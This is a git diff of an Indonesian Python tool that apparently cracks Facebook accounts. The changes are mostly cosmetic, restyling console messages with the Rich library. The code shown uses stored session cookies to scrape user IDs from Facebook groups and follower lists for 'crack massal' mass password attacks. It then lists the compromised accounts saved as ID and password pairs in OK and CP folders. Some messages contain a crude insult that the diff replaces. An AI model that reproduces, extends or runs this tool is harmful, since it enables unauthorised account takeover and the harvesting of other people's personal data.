@@ -576,11 +576,11 @@ def crack_group():
 		token = open('.token.txt','r').read()
 		cokies = open('.cok.txt','r').read()
 	except IOError:
-		print(' [+] Cookies Kadaluarsa ')
+		Console().print("[bold cyan]   ╰─>[bold red] Cookies Kadaluarsa ")
 		time.sleep(5)
 		login()
-	cetak(nel(' Pastikan Id Grup Bersifat Publik , Mohon Bersabar Dump Id Grup Sangat Lambat',width=80,style=f"bold white"))
-	url = input(f' [+] Id Group : ')
+	Console().print(panel('Pastikan Id Grup Bersifat Publik ,Dump Id Grup Mungkin Sangat Lambat',subtitle="╭───", subtitle_align="left",width=80,style=f"bold white"))
+	url = Console().print(f"[bold cyan]   ╰─> ")
 	kocak("https://mbasic.facebook.com/groups/"+url,cokies)
 	print("\r")
 	setting()
@@ -589,13 +589,13 @@ def kocak(url,cokies):
 	data = parser(ses.get(url,cookies={"cookie": cokies}).text, "html.parser")
 	judul = re.findall("<title>(.*?)</title>",str(data))[0]
 	if str(judul) == 'Use basic mode':
-		print('\n [+] Cokies Berada Dalam Mode Free');exit()
+		Console().print("[bold cyan]   ╰─>[bold red] Cokies Berada Dalam Mode Free");exit()
 	if str(judul) == 'Epsilon':
-		print('\n [+] Cokies Tidak Dpt Mengakses Grup');exit()
+		Console().print("[bold cyan]   ╰─>[bold red] Cokies Tidak Dpt Mengakses Grup");exit()
 	if str(judul) == 'Kesalahan':
-		print('\n [+] Cokies Yg Anda Masukan Salah');exit()
+		Console().print("[bold cyan]   ╰─>[bold red] Cokies Yg Anda Masukan Salah");exit()
 	if str(judul) == 'Masuk Facebook' or str(judul) == 'Masuk Facebook | Facebook' or str(judul) == 'Masuk ke Facebook' or str(judul) == 'Log in to Facebook':
-		print('\n [+] Cokies Mokad');exit()
+		Console().print("[bold cyan]   ╰─>[bold red] Cokies Mokad");exit()
 	else:
 		for isi in data.find_all("h3"):
 			for ids in isi.find_all("a",href=True):
@@ -605,7 +605,7 @@ def kocak(url,cokies):
 					else:uid = ids.get("href").split("/")[1].split("?")[0];nama = ids.text
 				if uid+"|"+nama in id:pass
 				else:id.append(uid+"|"+nama)
-				print('\r [+] Mengumpulkan %s Id'%(len(id)),end='')
+				Console().print("\r[bold cyan]   ╰─>[bold red] Mengumpulkan %s Id"%(len(id)),end='')
 		for x in data.find_all("a",href=True):
 			if "Lihat Postingan Lainnya" in x.text:
 				kocak("https://mbasic.facebook.com"+x.get("href"),cokies)
@@ -616,12 +616,12 @@ def pengikut():
 		token = open('.token.txt','r').read()
 		cookie = open('.cok.txt','r').read()
 	except IOError:
-		print(' [+] Cookies Kadaluarsa ')
+		Console().print("[bold cyan]   ╰─>[bold red] Cookies Kadaluarsa ")
 		time.sleep(5)
 		login()
 	ses = requests.Session()
-	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=80,padding=(0,7),style=f"bold white"))
-	user = input(f" [+] Masukan Id : ")
+	Console().print(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",subtitle="╭───", subtitle_align="left",width=80,padding=(0,7),style=f"bold cyan"))
+	user = Console().input("[bold cyan]   ╰─>[bold red] Masukan Id : ")
 	if user.isdigit():
 		url = (f"https://mbasic.facebook.com/profile.php?id={user}&v=followers")
 	else:
@@ -629,13 +629,13 @@ def pengikut():
 	try:
 		link = ses.get(url, cookies={"cookie": cookie}).text
 		if "Halaman Tidak Ditemukan" in link:
-			print("\n [+] Pengguna Dengan User Id {user} Tidak Ditemukan")
+			Console().print("[bold cyan]   ╰─>[bold red] Pengguna Dengan User Id {user} Tidak Ditemukan")
 			time.sleep(2);exit()
 		elif "Anda Diblokir Sementara" in link:
-			print("\n [+] Akun Anda Di Batasin Sementara")
+			Console().print("[bold cyan]   ╰─>[bold red] Akun Anda Di Batasin Sementara")
 			time.sleep(2);exit()
 		elif "Konten Tidak Ditemukan" in link:
-			print("\n [+] Pengguna Dengan User Id {user} Tidak Ditemukan")
+			Console().print("[bold cyan]   ╰─>[bold red] Pengguna Dengan User Id {user} Tidak Ditemukan")
 			time.sleep(2);exit()
 		else:
 			dump_followers(url, cookie)
@@ -655,23 +655,23 @@ def dump_followers(link, cookie):
 				id.append(re.findall("id=(.*?)&amp;eav", user[0])[0]+'|'+user[1])
 			else:
 				id.append(re.findall("(.*?)\?eav", user[0])[0]+'|'+user[1])
-			Console().print(f" [+] Sedang Mengumpulkan {str(len(id))} Id...", end='\r')
+			Console().print(f"[bold cyan]   ╰─>[bold green] Sedang Mengumpulkan {str(len(id))} Id...", end='\r')
 			time.sleep(000000.003)
 		if "Lihat Selengkapnya" in url:
 			dump_followers("https://mbasic.facebook.com"+parser(url, "html.parser").find("a", string="Lihat Selengkapnya").get("href"), cookie)
 	except:pass
 #-----------------[ HASIL-CRACK ]-----------------#
 def result():
-	Console().print(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Lihat Hasil OK[/]           [bold white][[bold cyan]02[/][bold white]][/] [bold white]Lihat Hasil CP[/]',width=90,padding=(0,11),title=f"[bold white][/][bold green]List Menu Cek[/][bold white][/]",style=f"bold white"))
-	kz = input(f' [+] Pilih : ')
+	Console().print(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Lihat Hasil OK[/]           [bold white][[bold cyan]02[/][bold white]][/] [bold white]Lihat Hasil CP[/]',subtitle="╭───", subtitle_align="left",width=80,padding=(0,11),title=f"[bold white][/][bold green]List Menu Cek[/][bold white][/]",style=f"bold cyan"))
+	kz = Console().print(f"[bold cyan]   ╰─> ")
 	if kz in ['2','02']:
 		try:vin = os.listdir('CP')
 		except FileNotFoundError:
-			print(' [+] File Tidak Di Temukan ')
+			Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
 			time.sleep(3)
 			exit()
 		if len(vin)==0:
-			print(' [+] Anda Tidak Memiliki Hasil CP ')
+			Console().print("[bold cyan]   ╰─>[bold red] Anda Tidak Memiliki Hasil CP ")
 			time.sleep(4)
 			exit()
 		else:
@@ -692,11 +692,11 @@ def result():
 			geeh = input(f'\n{P}{x}{H} [+] {x}{P}{x} {P}Select{x} : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print(' [+] Pilih Yang Bener Kontol ')
+				Console().print("[bold cyan]   ╰─>[bold red] Pilih Yang Bener Atuhh ")
 				exit()
 			try:lin = open('CP/'+geh,'r').read().splitlines()
 			except:
-				print(' [+] File Tidak Di Temukan ')
+				Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
 				time.sleep(4)
 				exit()
 			nocp=0
@@ -705,16 +705,16 @@ def result():
 				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
 				sol().print(mark(cpkuh,style="yellow"))
 				nocp +=1
-			input('[ Klik Enter ]')
+			input('[bold green][ Klik Enter For Exit ]')
 			exit()
 	elif kz in ['1','01']:
 		try:vin = os.listdir('OK')
 		except FileNotFoundError:
-			print(' [+] File Tidak Di Temukan ')
+			Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
 			time.sleep(4)
 			exit()
 		if len(vin)==0:
-			print(' [+] Anda Tidak Mempunyai File OK ')
+			Console().print("[bold cyan]   ╰─>[bold red] Anda Tidak Mempunyai File OK ")
 			time.sleep(4)
 			exit()
 		else:
@@ -732,14 +732,14 @@ def result():
 				else:
 					lol.update({str(cih):str(isi)})
 					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-			geeh = input('\n [+] Pilih : ')
+			geeh = Console().input("[bold cyan]   ╰─> ")
 			try:geh = lol[geeh]
 			except KeyError:
-				print(' [+] Pilih Yang Bener Kontol ')
+				Console().print("[bold cyan]   ╰─>[bold red] Pilih Yang Bener Atuhh")
 				exit()
 			try:lin = open('OK/'+geh,'r').read().splitlines()
 			except:
-				print(' [+] File Tidak Di Temukan ')
+				Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
 				time.sleep(4)
 				exit()
 			nocp=0
@@ -752,7 +752,7 @@ def result():
 			input('[ Klik Enter ]')
 			exit()
 	else:
-		print(' [+] Pilih Yang Bener Kontol ')
+		Console().print("[bold cyan]   ╰─>[bold red] Pilih Yang Bener Atuhh")
 		exit()
 	
 #-------------------[ CRACK-PUBLIK-MASSAL]----------------#
@@ -788,7 +788,7 @@ def massal():
 		Console(width=80, style="bold cyan").print(Panel('\t[bold yellow] Mau Berapa Target Yang Mau Di Crack',subtitle="╭───", subtitle_align="left", title="[bold green]>[hot_pink2] (Crack Masal) [bold green]<"))
 		jum = int(input(f"{O}   ╰─> "))
 	except ValueError:
-		print(' [+] Wrong input ')
+		Console().print("[bold cyan]   ╰─>[bold red] Wrong input ")
 		exit()
 	if jum<1 or jum>80:
 		Console().print("[bold cyan]   ╰─>[bold red] Pertemanan Tidak Publik  ")
@@ -812,7 +812,7 @@ def massal():
 		except (KeyError,IOError):
 			pass
 		except requests.exceptions.ConnectionError:
-			print(' [+] Unstable Signal ')
+			Console().print("[bold cyan]   ╰─>[bold red] Unstable Signal ")
 			exit()
 	try:
 		Console(width=80,style="bold cyan").print(panel("""[bold yellow] Total Id Target Yang Terkumpul""",subtitle="╭───", subtitle_align="left"))
